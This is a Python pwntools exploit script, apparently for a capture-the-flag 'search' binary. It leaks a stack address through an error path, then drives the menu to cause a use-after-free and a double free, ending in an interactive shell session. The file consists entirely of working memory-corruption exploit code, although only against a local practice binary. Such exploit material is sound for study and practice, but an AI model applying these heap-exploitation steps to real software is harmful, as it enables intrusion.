from pwn import *

binary = './search-bf61fbb8fa7212c814b2607a81a84adf'
context.log_level = 'debug'  # Add this to see all I/O
p = process(binary)

# Optional GDB attachment
s = '''
b * 0x00400ad0
'''
gdb.attach(p, s)

def leak_stack():
    # Send a large string to cause the error and recurse
    p.sendlineafter(b"Quit\n", b"A"*48)
    # Skip first error message
    p.recvuntil(b" is not a valid number\n")
    
    # Try again to leak stack data from deeper in the stack
    p.sendline(b"A"*48)
    leak_line = p.recvline()
    log.info(f"Leak line: {leak_line}")
    
    if b" is not a valid number" in leak_line:
        leak = leak_line.split(b" ")[0][48:]
        if leak:  # Make sure we got a leak
            return u64(leak.ljust(8, b'\x00'))
    
    # If we reach here, something went wrong
    log.error("Failed to leak stack address")
    return None

def searchWord(size, word):
    p.sendlineafter(b"Quit\n", b"1")
    p.sendlineafter(b"size:\n", str(size).encode())
    p.sendlineafter(b"word:\n", word)
    
def addsentence(size, sentence):
    p.sendlineafter(b"Quit\n", b"2")
    p.sendlineafter(b"size:\n", str(size).encode())
    p.sendlineafter(b"sentence:\n", sentence)

# First, leak a stack address
stack_leak = leak_stack()
log.info(f"Stack leak: {hex(stack_leak)}")

# After getting the stack leak, we need to get back to the main menu
# The binary might be waiting for a valid number
p.sendline(b"1")  # Send a valid number to exit the recursive function
p.sendline(b"4")  # Send a valid number to exit the recursive function
p.sendline(b"AAAA")  # Send a valid number to exit the recursive function
# The UAF and double free part
# Create several sentences with the same word
#p.interactive()
addsentence(14, b"AAAA BBBB CCCC")
for _ in range(6):
    addsentence(4, b"AAAA")

# Search for "AAAA" and delete all occurrences
# This will cause the sentence to be zeroed and freed
searchWord(4, b"AAAA")
for _ in range(7):
    p.sendlineafter(b"(y/n)?\n", b"y")

# Create new entries that will reuse the freed memory
addsentence(4, b"BBBB")
addsentence(4, b"BBBB")

# Search for "BBBB" and delete to trigger double free
searchWord(4, b"BBBB")
p.sendlineafter(b"(y/n)?\n", b"y")

p.interactive()
